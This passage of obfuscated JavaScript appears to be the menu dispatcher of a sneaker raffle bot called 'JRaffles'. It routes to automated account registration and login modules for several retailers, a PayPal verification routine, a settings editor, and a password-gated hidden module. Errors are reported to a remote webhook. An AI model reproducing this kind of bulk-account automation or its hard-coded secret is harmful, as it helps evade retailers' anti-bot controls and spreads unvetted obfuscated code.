                                                return await _0x2947dc('https://slamjam.nl/account/register', _0x250b30, _0x32019e, _0x2fe0ac), _0x39a975();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x2fe0ac = await _0x286f71(), _0x32019e = await _0x239535();
                                                    return await _0x591868('', _0x250b30, _0x32019e, _0x2fe0ac), _0x39a975();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0x3962b3[taskModule]['name'] == 'KICKZ') {
                                                taskFunction = await _0x190ee0(_0x3962b3[taskModule]['modules']);
                                                var _0x250b30 = _0x3962b3[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x2fe0ac = await _0x286f71(), _0x57ecf7 = await _0x239535();
                                                    return await _0xec94af('https://www.kickz.com/nl/login/', _0x250b30, _0x57ecf7, _0x2fe0ac), _0x39a975();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x2fe0ac = await _0x286f71(), _0x57ecf7 = await _0x239535();
                                                        return await _0x19fd04(_0x250b30, _0x57ecf7, _0x2fe0ac), _0x39a975();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x3962b3[taskModule]['name'] == 'JD') {
                                                    taskFunction = await _0x190ee0(_0x3962b3[taskModule]['modules']);
                                                    var _0x250b30 = _0x3962b3[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x2fe0ac = await _0x286f71(), _0x394389 = await _0x239535();
                                                        return await _0x175b78(_0x250b30, _0x394389, _0x2fe0ac), _0x39a975();
                                                    }
                                                } else {
                                                    if (_0x3962b3[taskModule]['name'] == 'Seven\x20Store')
                                                        return console['log']('returning\x20to\x20menu'), await _0x4e5841(0x3e8), _0x39a975();
                                                    else {
                                                        if (_0x3962b3[taskModule]['name'] == 'Paypal\x20Verification') {
                                                            var _0x397895 = _0x3962b3[taskModule]['name'], _0x2fe0ac = await _0x286f71();
                                                            const _0x183e02 = await _0x148442();
                                                            var _0x36c2c6 = _0x183e02['split'](';');
                                                            await _0x5260bd(_0x36c2c6, _0x397895, _0x2fe0ac);
                                                        } else {
                                                            if (_0x3962b3[taskModule]['name'] == 'Change\x20Settings') {
                                                                console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                var _0x3d682e = 0x0;
                                                                for (const _0x3d2b1f in _0x4c3205) {
                                                                    console['log']('(' + _0x3d682e + ')\x20' + _0x3d2b1f + '\x20:\x20' + _0x4c3205[_0x3d2b1f]), _0x3d682e++;
                                                                }
                                                                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x3d682e + ')\x20Return\x20to\x20Main\x20Menu');
                                                                var _0x4722d7 = await _0x3dd033();
                                                                if (_0x4722d7 == _0x3d682e)
                                                                    return _0x39a975();
                                                                console['clear'];
                                                                var _0x407ab1 = 0x0;
                                                                for (var _0x425438 in _0x4c3205) {
                                                                    if (_0x4722d7 == _0x407ab1) {
                                                                        console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0x425438 + '\x20:'), _0x4c3205[_0x425438] = await _0x14c07d(), _0x3fdbd7['writeFileSync']('../settings.json', JSON['stringify'](_0x4c3205));
                                                                        break;
                                                                    } else
                                                                        _0x407ab1++;
                                                                }
                                                                return console['log']('Settings\x20Saved!'), await _0x4e5841(0xbb8), _0x39a975();
                                                            } else {
                                                                if (_0x3962b3[taskModule]['name'] == 'Reload\x20Settings')
                                                                    return console['log']('Reloading\x20settings'), await _0x1fc110(), _0x39a975();
                                                                else {
                                                                    if (taskModule == 0x45) {
                                                                        _0x3962b3[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                        var _0x3f7d97 = await _0x3dd1cf();
                                                                        _0x3f7d97 == 'ModuleVoorDeBoys' ? (await _0x24a99c(), await _0x5f08f4(), await afewFunction(_0x531a02[_0x4abf3f], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0x4e5841(0xbb8));
                                                                    } else {
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            await _0x39a975();
        } catch (_0x30abcd) {
            return console['log'](_0x30abcd), await _0x4e5841(0x3a98);
        }
}
;
_0x4204b1('JRaffles\x20' + _0x4351c2), _0x1fc110();
try {
    _0x325b47();
} catch (_0x2376b1) {
    var _0xe48a5d = [{
        'type': 'rich',
        'title': 'Main\x20Menu\x20Error',
        'description': '',
        'color': 0xc0d6d6,
        'fields': [
            {
                'name': 'User',
                'value': '' + _0x4ca7a9
            },
            {
                'name': 'Version',
                'value': '' + _0x4351c2
            },
            {
                'name': 'Error',
                'value': '' + _0x2376b1
            }
        ]
    }];
    const _0x2408e1 = { 'embeds': _0xe48a5d };
    _0x331f59(_0x40d0b0, _0x2408e1);
}